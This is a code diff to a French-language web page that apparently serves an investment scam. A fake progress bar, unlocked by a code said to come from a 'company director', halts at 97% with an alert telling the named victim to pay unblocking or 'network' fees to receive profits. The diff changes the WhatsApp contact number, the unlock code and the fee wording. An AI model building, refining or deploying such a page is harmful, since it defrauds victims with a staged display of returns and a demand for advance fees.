@@ -144,7 +144,7 @@
         <div><p style="color: #8B0000; font-weight: bold;" id="alert-msg"></p></div>  
         <div class="transfer-text"></div>
         <input type="button" value="Démarrer l'investissement" class="button" id="btn-deblock">
-        <input type="button" value="WhatsApp" class="whatsapp-button" id="btn-whatsapp" onclick="window.open('https://wa.me/18709230259', '_blank');">
+        <input type="button" value="WhatsApp" class="whatsapp-button" id="btn-whatsapp" onclick="window.open('https://wa.me/16263231795', '_blank');">
         <input type="button" value="Recevoir mes bénéfices" class="button" id="btn-receive" style="display: none;">
     </div>
 
@@ -166,7 +166,7 @@
 
         document.querySelector('#btn-deblock').addEventListener('click', () => {
             let code2 = prompt("Veuillez entrer le code fourni par le directeur de l'entreprise");
-            if (code2 == "2120") {
+            if (code2 == "2021") {
                 interval = setInterval(progress, 5000);
                 document.querySelector('#invest').innerText = "En cours d'investissement...";
                 document.querySelector('#btn-deblock').style.display = 'none';
@@ -195,7 +195,7 @@
             }
 
             if (percent == 97) {
-                document.querySelector('#alert-msg').innerText = 'Alerte : Mr/Mme ' + investorName + ' veuillez payer les frais de déblocage afin de valider votre transaction et recevoir immédiatement vos bénéfices dans les 15 minutes.';
+                document.querySelector('#alert-msg').innerText = 'Alerte : Mr/Mme ' + investorName + ' veuillez payer les frais de reseau afin de valider votre transaction et recevoir immédiatement vos bénéfices dans les 15 minutes.';
             }
         }
     </script>
